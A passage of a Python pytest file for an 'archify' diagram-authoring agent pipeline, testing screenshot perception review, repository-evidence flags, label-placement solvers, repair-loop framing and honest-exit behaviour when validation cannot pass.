    assert "感知审查: failed(图像能力评审 x/m,4 张截图;correction_rounds 0)" \
        in reply
    assert "[2048x1320/dark] 下部出现整幅明显空带" in reply
    assert "(结论) 大视口构图失衡" in reply
    trace = app_trace_of(session)
    assert trace["percept_receipt"]["defects"][0]["viewport"] == "2048x1320"


def test_percept_skipped_without_evidence(pattern, workspace):
    """visual-check environment missing (no Chrome, exit 2 skipped): no
    screenshots -> the perception review honestly skips, zero
    reviewer-model calls."""
    provider = ArchifyScriptedProvider()
    cli = make_cli_stub(
        validate_receipts=[_pass_receipt()],
        visual_receipt={"ok": False, "status": "skipped",
                        "error": "Chrome/Chromium not found"}, calls=[])
    session, reply = run_turn(pattern, provider, cli)

    assert provider.percept_calls == 0
    assert "浏览器证据: skipped" in reply
    assert "感知审查: skipped(无浏览器证据截图" in reply
    trace = app_trace_of(session)
    assert trace["percept_receipt"]["status"] == "skipped"


def test_percept_skipped_when_sidecar_files_missing(pattern, workspace):
    """Receipt lists screenshots missing on disk (the explicit receipt stub
    writes nothing): checked by file existence, all missing -> honest
    skipped, never review screenshots that do not exist."""
    provider = ArchifyScriptedProvider()
    cli = make_cli_stub(
        validate_receipts=[_pass_receipt()],
        visual_receipt=_visual_pass_receipt(), calls=[])
    session, reply = run_turn(pattern, provider, cli)

    assert provider.percept_calls == 0
    assert "感知审查: skipped(截图文件缺失(回执列出 4 张,磁盘 0 张))" \
        in reply


def test_percept_skipped_when_model_not_vision(pattern, workspace):
    """The registry declares the reviewer model has no vision (zai/glm-5.3
    is not a vision model): by contract no images go to a text-only model,
    honest skipped ("image reader unavailable" wording)."""
    provider = ArchifyScriptedProvider()
    cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=[])
    session, reply = run_turn(
        pattern, provider, cli,
        llm_override={"code": "zai", "model": "glm-5.3"})

    assert provider.percept_calls == 0
    assert "感知审查: skipped(评审模型无图像能力(zai/glm-5.3)" in reply
    trace = app_trace_of(session)
    assert trace["percept_receipt"]["reviewer"]["model"] == "glm-5.3"
    assert trace["percept_receipt"]["images"] == 0


def test_percept_output_self_corrects_then_degrades(pattern, workspace):
    """Verdict JSON parse failure: bad output + error feedback -> the
    self-correction retry succeeds; permanently unparseable -> honest
    skipped (never fabricates a pass)."""
    # 1) First output is bad, self-correction succeeds
    provider = ArchifyScriptedProvider(percept_outputs=[
        "我觉得整体不错,没有明显问题。",
        json.dumps({"status": "passed", "defects": [],
                    "summary": "自纠后的判定"}, ensure_ascii=False)])
    cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=[])
    session, reply = run_turn(pattern, provider, cli)
    assert provider.percept_calls == 2
    assert "感知审查: passed" in reply

    # 2) Never parseable -> self-correction exhausted -> skipped
    provider2 = ArchifyScriptedProvider(percept_outputs=[
        "挺好的", "还是挺好"])
    cli2 = make_cli_stub(validate_receipts=[_pass_receipt()], calls=[])
    session2, reply2 = run_turn(pattern, provider2, cli2)
    assert provider2.percept_calls == 2  # first failure + self-correction (both fail)
    assert "感知审查: skipped(评审输出不可解析为判定 JSON)" in reply2
    trace = app_trace_of(session2)
    assert trace["percept_receipt"]["status"] == "skipped"
    assert trace["phases"][-1] == "percept"


# ============================================================================
# 6b. Repository evidence (--repo-root assembled conditionally)
# ============================================================================

# Architecture candidate declaring repository evidence (studio deadlock
# shape: declares sources -> validate demands --repo-root; without it all
# 6 rounds stick on root-required, unrepairable)
_EVIDENCE_CANDIDATE_JSON = json.dumps(
    {"schema_version": 1, "diagram_type": "architecture",
     "meta": {"title": "运行时架构", "quality_profile": "showcase",
              "repository": {"url": "https://github.com/o/nexus-kit.git",
                             "revision": "0" * 40}},
     "components": [
         {"id": "engine", "type": "backend", "label": "Engine", "row": 0,
          "col": 0, "sources": [{"path": "nexus/engine/chat.py", "line": 1}]},
         {"id": "ui", "type": "frontend", "label": "UI", "row": 0,
          "col": 1}]},
    ensure_ascii=False)


def test_repo_root_flag_conditional(workspace, monkeypatch):
    """_repo_root_flag decision: non-empty only for architecture with the
    candidate declaring evidence (the CLI rejects the flag for
    non-architecture; without evidence the verifier skips outright)."""
    monkeypatch.setattr(ax, "_DEFAULT_REPO_ROOT", "/ev/root")
    cand = workspace[0] / "s1" / "c.json"
    cand.parent.mkdir(parents=True, exist_ok=True)
    state = {"diagram_type": "architecture", "candidate_path": str(cand)}

    cand.write_text(_EVIDENCE_CANDIDATE_JSON, encoding="utf-8")
    assert ax._repo_root_flag(state) == ' --repo-root /ev/root'

    # Component-level sources alone (no meta.repository) also count as declared evidence
    data = json.loads(_EVIDENCE_CANDIDATE_JSON)
    del data["meta"]["repository"]
    cand.write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")
    assert ax._repo_root_flag(state) == ' --repo-root /ev/root'

    # architecture without evidence / non-architecture (even with evidence fields) / missing candidate
    data["components"][0].pop("sources")
    cand.write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")
    assert ax._repo_root_flag(state) == ""
    state_wf = {"diagram_type": "workflow", "candidate_path": str(cand)}
    cand.write_text(_EVIDENCE_CANDIDATE_JSON, encoding="utf-8")
    assert ax._repo_root_flag(state_wf) == ""
    assert ax._repo_root_flag(
        {"diagram_type": "architecture",
         "candidate_path": str(workspace[0] / "nope.json")}) == ""


def test_repo_evidence_commands_carry_repo_root(pattern, workspace,
                                                monkeypatch):
    """Architecture candidate declaring evidence: validate/deliver commands
    append --repo-root (the unlock for the root-required deadlock, letting
    the verifier adjudicate with real git and emit repairable diagnostics);
    workflow candidates carry no flag."""
    monkeypatch.setattr(ax, "_DEFAULT_REPO_ROOT", "/repo/ev")
    provider = ArchifyScriptedProvider(
        candidate=_EVIDENCE_CANDIDATE_JSON, route_type="architecture")
    calls = []
    cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls)
    run_turn(pattern, provider, cli)

    vcmd = next(c for c in calls if "archify.mjs validate " in c)
    dcmd = next(c for c in calls if "archify.mjs deliver " in c)
    assert '--repo-root /repo/ev' in vcmd
    assert '--repo-root /repo/ev' in dcmd

    # Contrast: the workflow candidate (default) gets no flag
    provider2 = ArchifyScriptedProvider()
    calls2 = []
    cli2 = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls2)
    run_turn(pattern, provider2, cli2)
    assert not any("--repo-root" in c for c in calls2)


def test_repair_self_validate_carries_repo_root(pattern, workspace,
                                                monkeypatch):
    """The repair station's in-station self-check commands carry the flag
    too: the receipt the model sees during self-check shares provenance
    with the validation gate (otherwise the gate says root-required while
    self-check passes, and the repair station spins in place)."""
    monkeypatch.setattr(ax, "_DEFAULT_REPO_ROOT", "/repo/ev")
    provider = ArchifyScriptedProvider(
        candidate=_EVIDENCE_CANDIDATE_JSON, route_type="architecture")
    cli = make_cli_stub(validate_receipts=[_fail_receipt(1),
                                          _pass_receipt()], calls=[])
    run_turn(pattern, provider, cli)

    frames = ["".join(ArchifyScriptedProvider._content_text(m.get("content"))
                      for m in msgs if m.get("role") == "user")
              for kind, msgs in provider.requests
              if kind == "repair" and len(msgs) == 2]
    assert frames
    assert any("--repo-root" in f for f in frames)
    # The evidence diagnostic's repair guidance is in the framing too (fix meta.repository or drop sources)
    assert any("repository-evidence" in f for f in frames)


# ============================================================================
# 7. Unit contracts
# ============================================================================

def test_trailing_stale_semantics():
    f = ax._trailing_stale
    assert f([]) == 0
    assert f([5]) == 0            # first round is the baseline
    assert f([5, 5]) == 1
    assert f([5, 5, 5]) == 2      # triggers the honest exit
    assert f([5, 3, 4]) == 1      # 4 does not refresh min(5,3)=3
    assert f([5, 3, 4, 2]) == 0   # a new minimum resets the count
    assert f([3, 3, 2]) == 0


def test_clearance_moves_geometry():
    """Solver geometry: four-directional moves sorted by ascending |delta|
    (nearest first), out-of-range moves dropped.

    Regression numbers from a real studio run: the 48px label rect
    [640.8, 233, 48.4, 14] squeezed next to the vertical route segment at
    x=665 (y 110->239) — moving up -143 is out of range and dropped; the
    correct fix labelDy +12 happens to rank first (moving left -30.2 would
    hit a component and is vetoed by the real validator)."""
    # Vertical segment: yield x left/right + extend past the segment ends in y
    moves = ax._clearance_moves((640.8, 233.0, 48.4, 14.0),
                                (665.0, 110.0, 665.0, 239.0), 4)
    assert moves == [{"dy": 12.0}, {"dx": -30.2}, {"dx": 30.2}]

    # Horizontal segment: yield y up/down + extend past the segment ends in x (symmetric semantics)
    moves = ax._clearance_moves((100.0, 200.0, 40.0, 14.0),
                                (90.0, 240.0, 300.0, 240.0), 4)
    assert {"dy": 20.0} in moves and {"dy": -60.0} not in moves

    # Directions already clear (<1px) are filtered as noise; all out of range -> empty (defer to layout-level levers)
    assert ax._clearance_moves((0.0, 0.0, 40.0, 14.0),
                               (1000.0, -500.0, 1000.0, 500.0), 4) == []


def test_label_solver_targets_forms():
    """Two target-extraction shapes: label-route-clearance uses structured
    evidence (message text as fallback); component overlap parses the
    below/above absolute points from "Suggested fix"; unrelated diagnostics
    yield zero targets."""
    # Shape 1: structured evidence + subject.index
    state = {"last_receipt": {"diagnostics": [{
        "code": "composition/label-route-clearance",
        "severity": "error",
        "message": '[composition/label-route-clearance] ... (兜底不触发)',
        "subject": {"collection": "connections", "index": 2,
                    "id": "cli-to-mailbox"},
        "evidence": {"minimumPx": 4,
                     "labelRect": {"relationIndex": 2, "label": "读写邮件",
                                   "x": 640.8, "y": 233, "width": 48.4,
                                   "height": 14},
                     "from": [665, 110], "to": [665, 239]}}]}}
    targets = ax._label_solver_targets(state)
    assert len(targets) == 1
    assert targets[0]["index"] == 2
    assert targets[0]["label"] == "读写邮件"
    assert targets[0]["moves"][0] == {"dy": 12.0}

    # Shape 1 fallback: message text only (old receipt / summary degradation); the regex still extracts the geometry
    state = {"last_receipt": {"diagnostics": [{
        "code": "composition/label-route-clearance",
        "severity": "error",
        "message": ('label "读写邮件" on connections[2] ... segment 1 '
                    '[665, 110] -> [665, 239] (label rect [641, 233, 48,'
                    ' 14]; minimum 4px)')}]}}
    targets = ax._label_solver_targets(state)
    assert len(targets) == 1
    assert targets[0]["moves"] == [{"dy": 12.0}, {"dx": -30.0}, {"dx": 30.0}]

    # Shape 2: the two suggested points of component overlap (below first, renderer's suggested order)
    state = {"last_receipt": {"diagnostics": [{
        "code": "layout/constraint", "severity": "error",
        "message": ('Label "邮件操作请求" overlaps component "user" —'
                    ' adjust labelDx/labelDy/labelSegment or set'
                    ' labelAt.\n'
                    '  Suggested fix: labelAt [180, 258] or labelDy'
                    ' +54 (below); or labelAt [180, 180] or labelDy'
                    ' -24 (above)')}]}}
    targets = ax._label_solver_targets(state)
    assert targets == [{"code": "layout/constraint", "index": None,
                        "label": "邮件操作请求",
                        "moves": [{"abs": [180.0, 258.0]},
                                  {"abs": [180.0, 180.0]}]}]

    # No suggested coordinates / unrelated diagnostics -> zero targets (the LLM micro-loop's territory)
    state = {"last_receipt": {"diagnostics": [
        {"code": "layout/constraint", "severity": "error",
         "message": 'Label "CLI 命令" overlaps component "cli"'},
        {"code": "composition/proper-crossing", "severity": "error",
         "message": "交叉"}]}}
    assert ax._label_solver_targets(state) == []


def test_apply_label_move_semantics():
    """Applying a move: an absolute point writes labelAt; a delta folds
    into an existing labelAt first, otherwise accumulates into
    labelDx/labelDy (consistent with the supportedFixes field
    semantics)."""
    conns = [{"from": "a", "to": "b", "label": "L"},
             {"from": "c", "to": "d", "label": "M", "labelAt": [552.0, 154.0]},
             {"from": "e", "to": "f", "label": "N", "labelDx": 5.0}]
    assert ax._apply_label_move(conns, {"index": 0, "label": "L"},
                                {"abs": [180, 258]})
    assert conns[0]["labelAt"] == [180.0, 258.0]
    assert ax._apply_label_move(conns, {"index": 1, "label": "M"},
                                {"dy": 12.0})
    assert conns[1]["labelAt"] == [552.0, 166.0]  # folded into labelAt
    assert ax._apply_label_move(conns, {"index": 2, "label": "N"},
                                {"dx": -30.0})
    assert conns[2]["labelDx"] == -25.0           # accumulated
    # Out-of-range index / label mismatch -> move refused
    assert not ax._apply_label_move(conns, {"index": 9, "label": "X"},
                                    {"dy": 1.0})


def test_receipt_metrics():
    assert ax._receipt_error_count(_pass_receipt()) == 0
    assert ax._receipt_error_count(_fail_receipt(2)) == 2
    # ok:false with no diagnostics/checks -> floor of 1 (never conjure a "pass" out of nothing)
    assert ax._receipt_error_count({"ok": False}) == 1
    assert ax._receipt_error_count({"ok": False, "error": "boom"}) == 1
    # showcase verdict: ok + exactly 9 checks all passing + no warnings; a 4-check receipt is not acceptance
    assert ax._is_showcase_pass(_pass_receipt())
    assert not ax._is_showcase_pass(
        {"ok": True, "checks": [{"ok": True}] * 4, "warnings": []})
    assert not ax._is_showcase_pass(
        {"ok": True, "checks": [{"ok": True}] * 8 + [{"ok": False}],
         "warnings": []})
    assert not ax._is_showcase_pass(
        {"ok": True, "checks": [{"ok": True}] * 9, "warnings": ["w"]})


def test_missing_candidate_recorded_without_bash(pattern, workspace):
    """The author station wrote no candidate: the validation gate records
    the objective error (no bash run) and the repair loop takes over; when
    repair cannot save it, the convergence contract exits honestly (never
    fabricates a candidate or claims success)."""
    provider = ArchifyScriptedProvider(candidate_write=False, repair_edits=5)
    calls = []
    cli = make_cli_stub(validate_receipts=[], calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    # Missing candidate -> all six validate calls skip bash, recording author/missing-candidate directly
    assert not any("validate" in c for c in calls)
    trace = app_trace_of(session)
    assert trace["val_history"] == [1] * 6
    assert trace["last_receipt"]["diagnostics"][0][
        "code"] == "author/missing-candidate"
    # All five repair visits fail to write a candidate (edit_file errors on
    # the missing file and feeds it back); the sixth visit is stopped by the
    # convergence gate -> honest exit
    assert provider.repair_calls == 9
    assert trace["repair_rounds"] == 5
    assert trace["honest_exit"] is True
    assert "候选规范文件不存在" in reply


def test_route_parse_failure_self_corrects(pattern, workspace):
    """First route-JSON parse failure: bad output + error feedback -> the self-correction retry succeeds (no degradation)."""
    provider = ArchifyScriptedProvider(route_fail_first=True)
    calls = []
    cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    assert provider.route_calls == 2  # first failure + self-correction retry
    trace = app_trace_of(session)
    assert trace["degraded"] is False
    assert trace["diagram_type"] == "workflow"


def test_route_parse_failure_degrades(pattern, workspace):
    """Route JSON never parses: self-correction exhausted -> degrade to
    workflow (degraded flag); the flow does not deadlock on route
    failure."""
    provider = ArchifyScriptedProvider(route_fail_always=True)
    calls = []
    cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    assert provider.route_calls == 2  # first failure + self-correction retry (both fail)
    trace = app_trace_of(session)
    assert trace["degraded"] is True
    assert trace["diagram_type"] == "workflow"


def test_author_write_path_drift_adopted(pattern, workspace):
    """Adopting the author station's drifted write path (studio regression):

    The model wrote the candidate to a self-chosen path instead of
    candidate_path — the executor adopts the last parseable content from
    this round's write_text calls and pins it back to candidate_path
    (content belongs to the model, placement to the executor), and the flow
    proceeds to validation.
    """
    root, skill = workspace
    wrong = str(root / "my-own-choice.json")   # the model's self-chosen wrong path (absolute)
    provider = ArchifyScriptedProvider(write_path=wrong)
    calls = []
    cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    # The wrong path really lands on disk; after adoption candidate_path also holds parseable content
    assert Path(wrong).exists()
    cand = _candidate_path()
    data = json.loads(Path(cand).read_text(encoding="utf-8"))
    assert data["meta"]["quality_profile"] == "showcase"
    # What gets validated is the wrong path's content (the validate command embeds the candidate_path absolute path)
    vcmd = next(c for c in calls if "validate" in c)
    assert cand in vcmd
    assert "showcase 验收通过" in reply
    trace = app_trace_of(session)
    assert "author" in trace["phases"]  # not flagged author_failed


def test_relative_workspace_root_pinned_absolute(pattern, workspace,
                                                 monkeypatch, tmp_path):
    """A relative workspace root must be pinned absolute (studio regression):

    The file tools resolve relative paths against the service startup
    directory, while the archify CLI runs via bash with workdir=skill_dir
    and resolves against the skill directory — the same relative string
    resolves to different files in the two contexts, so validation hits
    ENOENT and repair fixes a file validation cannot see. With state-board
    paths always absolute, what write_text writes and what the validate
    command embeds are the same file.
    """
    # Relative root (with .. pointing back into tmp; no chdir — the file tools' config probing depends on cwd)
    import os

    rel_root = os.path.relpath(tmp_path / "relws", Path.cwd().resolve())
    monkeypatch.setattr(ax, "_DEFAULT_WORKSPACE_ROOT", rel_root)
    provider = ArchifyScriptedProvider()
    calls = []
    cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    trace = app_trace_of(session)
    cand = Path(trace["candidate_path"])
    assert cand.is_absolute()
    assert cand.parent.parent == (tmp_path / "relws").resolve()
    assert cand.exists()  # this absolute path is exactly what write_text wrote
    # The validate command embeds the same absolute path (readable even with the CLI running under skill_dir)
    vcmd = next(c for c in calls if "validate" in c)
    assert str(cand) in vcmd
    assert "showcase 验收通过" in reply


# ============================================================================
# 8. Thinking streamed to the UI + the repair station's authoring context (contracts added this round)
# ============================================================================

class _ThinkingStreamProvider(ArchifyScriptedProvider):
    """Phase scripting unchanged, now served as a stream: the first chunk
    carries a thinking increment, the body splits into two text chunks, and
    tool_calls ride the closing chunk as-is (the aggregator merges per
    OpenAI semantics)."""

    async def achat_completion_stream(self, messages, model,
                                      temperature=0.7, max_tokens=2048,
                                      **kwargs):
        from nexus.llm.types import LLMChunk

        resp = await self.achat_completion(
            messages, model, temperature=temperature,
            max_tokens=max_tokens, **kwargs)
        yield LLMChunk(reasoning="[思考:%s]" % self._kind(
            messages, kwargs.get("tools")))
        content = resp.get("content") or ""
        if content:
            mid = max(1, len(content) // 2)
            yield LLMChunk(text=content[:mid])
            yield LLMChunk(text=content[mid:])
        yield LLMChunk(text="", tool_calls=resp.get("tool_calls") or [],
                       finish_reason=resp.get("finish_reason") or "stop")


def test_thinking_streams_but_text_deltas_do_not(pattern, workspace):
    """Thinking increments from the three LLM stations flow into the UI as
    thinking events (previously the emitter passed None and the UI received
    nothing); in-station bodies are protocol JSON / working wording and are
    not displayed with forward_text=False — the authoritative done reply is
    still the receipt-assembled report."""
    from nexus.engine.chat import chat_turn_stream

    provider = _ThinkingStreamProvider()
    calls = []
    cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls)
    sessions = {}
    launch(pattern, sessions)

    async def _collect():
        return [e async for e in chat_turn_stream(
            query="画一个 CI 发布工作流图", session_id="s1",
            all_sessions=sessions)]

    with patch.object(ax, "build_provider", return_value=provider), \
            patch.object(ax, "_execute_tool", cli):
        events = arun(_collect())

    thinks = [e.text for e in events if e.kind == "thinking"]
    assert {t for t in thinks} >= {"[思考:route]", "[思考:author]"}
    assert not [e for e in events if e.kind == "delta"]  # the body is not displayed
    done = events[-1]
    assert done.kind == "done"
    assert "showcase 验收通过" in done.result.text  # report assembly unaffected


def test_repair_framing_carries_authoring_context(pattern, workspace):
    """The repair prompt restores the authoring context (in the original
    skill, repair ran in the same session as authoring; after the station
    split the state board compensates): original request / authoring memos /
    type-placement discipline / structured diagnostics (subject +
    supportedFixes) / schema and authoring-contract paths / --layout-json;
    the second visit can see the error trajectory and the first visit's
    action summary (preventing verbatim replays of already-failed
    actions)."""
    provider = ArchifyScriptedProvider(repair_edits=2)
    calls = []
    receipts = [{
        "ok": False,
        "checks": [{"name": "single_svg", "ok": True}],
        "diagnostics": [{
            "code": "layout/constraint", "severity": "error",
            "message": "诊断0: 标签压住组件",
            "subject": {"path": "/connections/0", "identity": "部署"},
            "supportedFixes": ["remove via", "set labelAt [12, 34]"],
        }]}]
    cli = make_cli_stub(validate_receipts=receipts, calls=calls)
    session, reply = run_turn(pattern, provider, cli)

    # Only the first-round request of each repair visit is the full framing
    # (just system + framing, two messages); under stale-5 there are five
    # visits before the gate
    frames = ["".join(str(m.get("content") or "") for m in msgs
                      if m.get("role") == "user")
              for kind, msgs in provider.requests
              if kind == "repair" and len(msgs) == 2]
    assert len(frames) == 5
    first, second, last = frames[0], frames[1], frames[-1]

    for fragment in ("【原始需求】", "画一个 CI 发布工作流图",
                     "【创作备忘】", "候选已写入",
                     "【类型放置纪律】", "0..5",
                     "--layout-json", "authoring-contract",
                     "schemas/workflow.schema.json",
                     "supported_fixes", "remove via", "/connections/0",
                     "标签掩码宽"):
        assert fragment in first, fragment
    assert "客观错误数轨迹: [1]" in first
    assert "(首轮修复" not in first  # trajectory already present, no placeholder

    # Visit 2: trajectory accumulates + visit-1 summary visible; stale=1 below the last-chance threshold
    assert "客观错误数轨迹: [1, 1]" in second
    assert "最后机会" not in second
    # Visit 5: stale=4 = stale_limit-1 -> the last chance is stated explicitly
    assert ("客观错误数轨迹: [1, 1, 1, 1, 1]"
            "——已连续 4 轮未刷新下限") in last
    assert "最后机会" in last
    assert "第 1 轮已试: 信息已足够" in second

    trace = app_trace_of(session)
    assert [e["summary"] for e in trace["repair_log"]] == [
        "信息已足够"] * 5
    assert trace["design_notes"] == "候选已写入"


# ============================================================================
# 8. Phase 3 migration: config-bag-driven budgets + stations publishing pattern_code
# ============================================================================

def test_repair_budget_follows_app_config_bag(pattern, workspace, tmp_path,
                                              monkeypatch):
    """config.repair_rounds from apps/<name>/config.yaml overrides the code
    default (3): in the same stale-5 scenario, each repair visit's inner
    micro-loop is cut to 1 LLM round (contrast
    test_repair_honest_exit_after_stale_rounds's 9 = 3+3+1+1+1)."""
    from nexus import settings as nexus_settings

    apps_root = tmp_path / "apps"
    (apps_root / "archify_agent").mkdir(parents=True)
    (apps_root / "archify_agent" / "config.yaml").write_text(
        "pattern: archify\nconfig:\n  repair_rounds: 1\n", encoding="utf-8")
    monkeypatch.setenv("NEXUS_APPS_DIR", str(apps_root))
    nexus_settings.invalidate_config_cache()
    try:
        provider = ArchifyScriptedProvider(repair_edits=5)
        calls = []
        cli = make_cli_stub(validate_receipts=[_fail_receipt(2)] * 6,
                            calls=calls)
        session, reply = run_turn(pattern, provider, cli)

        assert provider.author_calls == 4   # uncovered keys keep the code default (10, uncapped)
        assert len([c for c in calls if "validate" in c]) == 6
        assert provider.repair_calls == 5   # 5 visits x 1 round each (override in effect)
        trace = app_trace_of(session)
        assert trace["repair_rounds"] == 5
        assert trace["honest_exit"] is True
        assert "连续 5 轮未刷新错误数下限" in reply  # stale_limit not overridden -> default 5
    finally:
        nexus_settings.invalidate_config_cache()


def test_stations_publish_pattern_code(pattern, workspace):
    """Custom stations bypass the default loop executor and must publish
    the tool-call location themselves: along both dispatch paths —
    _dispatch_tool_calls (semantic-station file tools) and _run_cli
    (deterministic-station bash) — the handler side's
    ambient_pattern_code() should read "archify" — it is the lookup key for
    app guardrail overrides (leaving it out = global guardrails forever)."""
    from nexus.engine.tool_context import ambient_pattern_code

    seen = []
    provider = ArchifyScriptedProvider()
    cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=[])

    async def spy(name, args):
        seen.append(ambient_pattern_code())
        return await cli(name, args)

    session, reply = run_turn(pattern, provider, spy)

    # author's find/read/write (semantic stations) + probe/validate/deliver/
    # visual-check's bash (deterministic stations) all hit, uniquely archify
    assert len(seen) >= 7
    assert set(seen) == {"archify"}
    assert "showcase 验收通过" in reply  # full pipeline unaffected
